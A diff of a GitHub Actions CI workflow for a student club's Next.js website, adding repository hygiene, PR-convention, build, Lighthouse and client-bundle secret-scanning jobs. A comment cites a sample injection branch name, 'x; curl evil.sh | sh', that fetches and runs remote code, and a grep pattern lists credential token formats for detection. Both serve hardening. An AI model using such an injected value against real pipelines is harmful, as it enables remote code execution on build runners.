@@ -1,169 +1,409 @@
 # ==============================================================================
-# GitHub Actions CI Workflow for OSS Club Website
-# Open Source Software Club at Sai Vidya Institute of Technology, Bengaluru
-# Org: https://github.com/Open-Source-Software-Club
-# Repo: https://github.com/Open-Source-Software-Club/OSS_website
+# CI — the quality gate for the OSS Club Website
 #
-# Defined package.json scripts executed in this workflow:
-#   - lint: next lint
-#   - type-check: tsc --noEmit
-#   - test: vitest run
-#   - build: next build
+# Repository : Open-Source-Software-Club/OSS_website
+# Docs       : docs/CI_CD.md  (full pipeline documentation)
+#
+# WHAT THIS WORKFLOW GUARANTEES
+#   Nothing reaches `main` unless it is formatted, lint-clean, type-safe,
+#   tested, buildable, free of secrets, free of forbidden files, and attached
+#   to a properly named branch with a Conventional Commit title.
+#
+# DESIGN NOTES
+#   1. Every job ALWAYS runs and ALWAYS reports a conclusion. A job that is
+#      "skipped" cannot be a required status check without deadlocking merges,
+#      so jobs that have nothing to do yet (Phase 0 scaffolding has not landed)
+#      explicitly succeed with a ::notice:: instead of being skipped.
+#   2. The repository gate (scripts/checks/) is dependency-free shell. It runs
+#      identically here and inside .githooks/pre-push on a contributor's
+#      machine, so what is enforced locally is exactly what is enforced here.
+#   3. One workflow per concern — security.yml for credentials, db-check.yml for
+#      the schema, e2e.yml for browser tests — so each maps to exactly one
+#      required status check.
+#   4. Required checks are listed in docs/CI_CD.md and applied by
+#      .github/branch-protection/apply.sh.
 # ==============================================================================
 
 name: CI
 
 on:
-  push:
-    branches:
-      - main
   pull_request:
-    branches:
-      - main
+    branches: [main]
+  push:
+    branches: [main]
+  workflow_dispatch:
 
 concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
+  group: ci-${{ github.ref }}
   cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
 
+env:
+  PNPM_VERSION: '9.15.9'
+  NODE_VERSION: '22'
+  NEXT_TELEMETRY_DISABLED: '1'
+
+# Least privilege: the workflow only needs to read the repository.
+permissions:
+  contents: read
+
 jobs:
-  lint-and-typecheck:
-    name: Lint & Typecheck
+  # ---------------------------------------------------------------------------
+  # Job 1 — Repository hygiene: the "no unwanted code" gate.
+  #
+  # Runs on every push and every pull request, unconditionally, because these
+  # checks do not depend on the application toolchain existing yet.
+  # ---------------------------------------------------------------------------
+  hygiene:
+    name: Repository Hygiene
     runs-on: ubuntu-latest
+    timeout-minutes: 15
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
-
-      - name: Setup pnpm
-        uses: pnpm/action-setup@v4
         with:
-          version: 9
+          fetch-depth: 0
 
-      - name: Setup Node.js 18
-        uses: actions/setup-node@v4
-        with:
-          node-version: 18
-          cache: 'pnpm'
+      - name: Block forbidden files
+        run: bash scripts/checks/check-forbidden-files.sh
 
-      - name: Install dependencies
-        run: pnpm install --frozen-lockfile
+      # Credential scanning is deliberately NOT here: it lives in
+      # .github/workflows/security.yml as its own required check ("Secret Scan"),
+      # so a leak is unmistakable in the Checks tab and in branch protection.
+      # The same script runs in .githooks/pre-commit on every clone.
 
-      - name: Run linter (pnpm lint)
-        run: pnpm lint
+      - name: Block oversized files
+        run: bash scripts/checks/check-large-files.sh
 
-      - name: Run TypeScript type check (pnpm type-check)
-        run: pnpm type-check
+      - name: Enforce lockfile policy (pnpm only)
+        run: bash scripts/checks/check-lockfiles.sh
 
-  test:
-    name: Unit & Integration Tests
+      - name: Enforce whitespace and encoding hygiene
+        run: bash scripts/checks/check-text-hygiene.sh
+
+      - name: Validate YAML syntax
+        run: |
+          python3 - <<'PY'
+          import pathlib, sys
+          try:
+              import yaml
+          except ImportError:
+              print("::notice::PyYAML is not available on this runner; skipping YAML syntax validation.")
+              sys.exit(0)
+
+          failures = []
+          for path in sorted(pathlib.Path('.').rglob('*.yml')) + sorted(pathlib.Path('.').rglob('*.yaml')):
+              if any(part in {'.git', 'node_modules'} for part in path.parts):
+                  continue
+              try:
+                  yaml.safe_load(path.read_text(encoding='utf-8'))
+              except yaml.YAMLError as exc:
+                  failures.append(f"{path}: {exc}")
+                  print(f"::error file={path}::Invalid YAML: {exc}")
+
+          if failures:
+              sys.exit(1)
+          print("All YAML files parse cleanly.")
+          PY
+
+      - name: Lint workflow structure with actionlint
+        run: |
+          # --shellcheck= and --pyflakes= disable the optional external
+          # analysers. The workflows contain no shell scripts that need them,
+          # and depending on their presence makes this check fail on a runner
+          # image change rather than on a real workflow defect.
+          #
+          # The 'vars' ignore covers actionlint builds whose context table
+          # predates the `vars` repository-variable context (added to GitHub
+          # Actions in 2022 and to actionlint in v1.6.30). `vars` is valid in
+          # jobs.<job_id>.env and jobs.<job_id>.environment; the pinned image
+          # understands it, but the ignore keeps this check green everywhere.
+          docker run --rm --volume "$PWD:/repo" --workdir /repo \
+            rhysd/actionlint:v1.7.12 -color -shellcheck= -pyflakes= \
+            -ignore 'undefined variable "vars"'
+
+      - name: Validate CODEOWNERS
+        run: |
+          if [ ! -f .github/CODEOWNERS ]; then
+            echo "::error::.github/CODEOWNERS is missing. It is what routes reviews of sensitive paths to the right people."
+            exit 1
+          fi
+          bad=0
+          while IFS= read -r line; do
+            case "$line" in ''|'#'*) continue ;; esac
+            if ! printf '%s' "$line" | grep -Eq '^[^[:space:]]+[[:space:]]+@?[A-Za-z0-9_./@-]+([[:space:]]+@?[A-Za-z0-9_./@-]+)*$'; then
+              echo "::error::Malformed CODEOWNERS line: $line"
+              bad=1
+            fi
+          done < .github/CODEOWNERS
+          [ "$bad" -eq 0 ] && echo "CODEOWNERS is present and well-formed."
+          exit "$bad"
+
+      - name: Verify repository documentation is current
+        run: |
+          # A pipeline nobody can read is a pipeline nobody maintains.
+          for required in docs/CI_CD.md CONTRIBUTING.md SECURITY.md; do
+            if [ ! -f "$required" ]; then
+              echo "::error::Required documentation file '$required' is missing."
+              exit 1
+            fi
+          done
+          echo "Required documentation is present."
+
+  # ---------------------------------------------------------------------------
+  # Job 2 — Pull-request discipline.
+  #
+  # Only meaningful for pull requests: title conventions, branch naming,
+  # issue linkage, PR size, and linear history.
+  # ---------------------------------------------------------------------------
+  pr-conventions:
+    name: PR Conventions
     runs-on: ubuntu-latest
-    needs: lint-and-typecheck
+    needs: hygiene
+    if: github.event_name == 'pull_request'
+    timeout-minutes: 15
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
-
-      - name: Setup pnpm
-        uses: pnpm/action-setup@v4
         with:
-          version: 9
+          fetch-depth: 0
 
-      - name: Setup Node.js 18
-        uses: actions/setup-node@v4
-        with:
-          node-version: 18
-          cache: 'pnpm'
+      - name: Fetch the base branch
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: git fetch --no-tags --depth=1 origin "+refs/heads/$BASE_REF:refs/remotes/origin/$BASE_REF"
 
-      - name: Install dependencies
-        run: pnpm install --frozen-lockfile
+      # `github.head_ref` is attacker-controlled: a contributor can name a
+      # branch `x; curl evil.sh | sh` and GitHub will interpolate it into the
+      # script before the shell ever sees it. Always pass untrusted values
+      # through the environment and reference them as shell variables.
+      - name: Validate branch naming
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
+        run: bash scripts/checks/check-branch-name.sh "$HEAD_REF"
 
-      - name: Run test suite with coverage (pnpm test -- --coverage)
-        run: pnpm test -- --coverage
+      - name: Validate commit messages (Conventional Commits)
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          bash scripts/checks/check-commit-msg.sh --range "origin/$BASE_REF...HEAD"
 
-      - name: Upload test coverage report
+      - name: Validate pull-request metadata
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          PR_HEAD_REF: ${{ github.head_ref }}
+          PR_BASE_REF: ${{ github.base_ref }}
+          PR_COMMITS: ${{ github.event.pull_request.commits }}
+          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
+          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
+          PR_CHANGED_FILES: ${{ github.event.pull_request.changed_files }}
+        run: bash scripts/checks/check-pr-meta.sh
+
+      - name: Semantic pull-request title (advisory annotations)
         if: always()
-        uses: actions/upload-artifact@v4
+        uses: amannn/action-semantic-pull-request@v5
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         with:
-          name: test-coverage-report
-          path: coverage/
-          retention-days: 14
+          types: |
+            feat
+            fix
+            docs
+            style
+            refactor
+            perf
+            test
+            build
+            ci
+            chore
+            revert
+          requireScope: false
+          subjectPattern: '^[a-z].{1,71}$'
+          subjectPatternError: >
+            The PR title subject must start with a lowercase letter and be at
+            most 72 characters, because it becomes the squash-merge commit on
+            main.
+        continue-on-error: true
 
-  build:
-    name: Build Next.js Application
+  # ---------------------------------------------------------------------------
+  # Job 3 — Verify: lint, types, formatting, tests, build.
+  #
+  # Activates automatically the moment package.json + pnpm-lock.yaml land.
+  # Until then it succeeds with an explanatory notice so it can safely be a
+  # required status check from day one.
+  # ---------------------------------------------------------------------------
+  verify:
+    name: Verify (Lint · Types · Tests · Build)
     runs-on: ubuntu-latest
-    needs: lint-and-typecheck
-    env:
-      NEXT_TELEMETRY_DISABLED: 1
-      NEXT_PUBLIC_SUPABASE_URL: https://[PLACEHOLDER].supabase.co
-      NEXT_PUBLIC_SUPABASE_ANON_KEY: [PLACEHOLDER_SUPABASE_ANON_KEY]
+    needs: hygiene
+    timeout-minutes: 25
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Setup pnpm
-        uses: pnpm/action-setup@v4
-        with:
-          version: 9
+      - name: Detect application toolchain
+        id: detect
+        run: |
+          if [ -f package.json ] && [ -f pnpm-lock.yaml ]; then
+            echo "app=true" >> "$GITHUB_OUTPUT"
+            echo "Node toolchain detected."
+          else
+            echo "app=false" >> "$GITHUB_OUTPUT"
+            echo "::notice::Phase 0 scaffolding has not landed yet (no package.json + pnpm-lock.yaml). There is nothing to lint, type-check, test or build — this check will activate automatically once the application exists."
+          fi
 
-      - name: Setup Node.js 18
+      - name: Setup Node.js
+        if: steps.detect.outputs.app == 'true'
         uses: actions/setup-node@v4
         with:
-          node-version: 18
-          cache: 'pnpm'
+          node-version: ${{ env.NODE_VERSION }}
 
-      - name: Install dependencies
+      - name: Install pnpm
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          npm install --global "pnpm@$PNPM_VERSION"
+          pnpm --version
+
+      - name: Resolve pnpm store path
+        if: steps.detect.outputs.app == 'true'
+        id: store
+        run: echo "path=$(pnpm store path --silent)" >> "$GITHUB_OUTPUT"
+
+      - name: Cache the pnpm store
+        if: steps.detect.outputs.app == 'true'
+        uses: actions/cache@v4
+        with:
+          path: ${{ steps.store.outputs.path }}
+          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}
+          restore-keys: |
+            ${{ runner.os }}-pnpm-store-
+
+      - name: Install dependencies (frozen lockfile)
+        if: steps.detect.outputs.app == 'true'
         run: pnpm install --frozen-lockfile
 
-      - name: Build Next.js application (pnpm build)
-        run: pnpm build
+      - name: Verify the lockfile was not mutated by install
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          if ! git diff --quiet -- pnpm-lock.yaml; then
+            echo "::error::'pnpm install' modified pnpm-lock.yaml. Commit the regenerated lockfile so CI can run with --frozen-lockfile."
+            git diff -- pnpm-lock.yaml | head -50
+            exit 1
+          fi
+          echo "pnpm-lock.yaml is in sync with package.json."
 
-      - name: Upload build artifacts
+      - name: Lint
+        if: steps.detect.outputs.app == 'true'
+        run: bash scripts/ci/run-script.sh lint
+
+      - name: Type check
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          # README documents `pnpm typecheck` while the original workflow used
+          # `type-check`; accept either name so neither convention breaks CI.
+          bash scripts/ci/run-script.sh type-check || bash scripts/ci/run-script.sh typecheck
+
+      - name: Format check
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          bash scripts/ci/run-script.sh format:check || bash scripts/ci/run-script.sh format --check
+
+      - name: Unit and integration tests
+        if: steps.detect.outputs.app == 'true'
+        run: bash scripts/ci/run-script.sh test -- --coverage
+
+      - name: Build
+        if: steps.detect.outputs.app == 'true'
+        env:
+          # CI never has real credentials. Placeholder values let the
+          # production build run; SKIP_ENV_VALIDATION is the documented escape
+          # hatch from lib/env.ts for exactly this situation.
+          NEXT_PUBLIC_SITE_URL: http://localhost:3000
+          NEXT_PUBLIC_SUPABASE_URL: https://ci-placeholder.supabase.co
+          NEXT_PUBLIC_SUPABASE_ANON_KEY: ci-placeholder-anon-key
+          SKIP_ENV_VALIDATION: '1'
+        run: bash scripts/ci/run-script.sh build
+
+      - name: Assert no server secrets leaked into the client bundle
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          # Roadmap MVP acceptance criterion: "No secrets in client bundle".
+          # NEXT_PUBLIC_* values are shipped to the browser by design; anything
+          # else that looks like a credential in the client output is a bug.
+          target=".next"
+          if [ ! -d "$target" ]; then
+            echo "::notice::No .next/ output directory — nothing to scan."
+            exit 0
+          fi
+          patterns='SUPABASE_SERVICE_ROLE_KEY|SERVICE_ROLE_SECRET|service_role|-----BEGIN [A-Z ]*PRIVATE KEY|ghp_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|sk_live_'
+          if grep -rEl "$patterns" "$target" 2>/dev/null | head -20 | grep .; then
+            echo "::error::Credential material found in the client build output. Server-only secrets must never be imported into a Client Component or a public route."
+            exit 1
+          fi
+          echo "Client bundle is free of credential material."
+
+      - name: Upload build output
+        if: steps.detect.outputs.app == 'true'
         uses: actions/upload-artifact@v4
         with:
           name: next-build-output
           path: .next/
           retention-days: 7
+          if-no-files-found: ignore
 
+  # ---------------------------------------------------------------------------
+  # Job 4 — Accessibility budget (Lighthouse CI).
+  #
+  # Budgets come from docs/UI_UX_SPECIFICATION.md and the roadmap MVP gate:
+  # performance >= 90, accessibility >= 95.
+  # ---------------------------------------------------------------------------
   accessibility:
-    name: Accessibility Audit (Lighthouse CI)
+    name: Accessibility (Lighthouse)
     runs-on: ubuntu-latest
-    needs: build
-    env:
-      NEXT_TELEMETRY_DISABLED: 1
-      NEXT_PUBLIC_SUPABASE_URL: https://[PLACEHOLDER].supabase.co
-      NEXT_PUBLIC_SUPABASE_ANON_KEY: [PLACEHOLDER_SUPABASE_ANON_KEY]
+    needs: verify
+    timeout-minutes: 20
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Setup pnpm
-        uses: pnpm/action-setup@v4
-        with:
-          version: 9
+      - name: Detect application toolchain
+        id: detect
+        run: |
+          if [ -f package.json ] && [ -f pnpm-lock.yaml ]; then
+            echo "app=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "app=false" >> "$GITHUB_OUTPUT"
+            echo "::notice::Lighthouse CI will activate once the Next.js application exists."
+          fi
 
-      - name: Setup Node.js 18
+      - name: Setup Node.js
+        if: steps.detect.outputs.app == 'true'
         uses: actions/setup-node@v4
         with:
-          node-version: 18
-          cache: 'pnpm'
+          node-version: ${{ env.NODE_VERSION }}
 
-      - name: Install dependencies
-        run: pnpm install --frozen-lockfile
+      - name: Install pnpm and dependencies
+        if: steps.detect.outputs.app == 'true'
+        run: |
+          npm install --global "pnpm@$PNPM_VERSION"
+          pnpm install --frozen-lockfile
 
-      - name: Download build artifacts
+      - name: Download build output
+        if: steps.detect.outputs.app == 'true'
         uses: actions/download-artifact@v4
         with:
           name: next-build-output
           path: .next/
 
-      - name: Run Lighthouse CI accessibility audit
+      - name: Run Lighthouse CI
+        if: steps.detect.outputs.app == 'true'
         uses: treosh/lighthouse-ci-action@v12
         with:
+          configPath: .github/lighthouse/config.json
           startServerCommand: pnpm start
-          startServerReadyPattern: 'ready on|Ready on|Local:'
-          startServerReadyTimeout: 30000
-          url: |
-            http://localhost:3000/
+          startServerReadyPattern: 'ready on|Ready on|Local:|started server'
+          startServerReadyTimeout: 60000
           uploadArtifacts: true
           temporaryPublicStorage: false
-          assertions: |
-            categories:accessibility:
-              minScore: 0.90
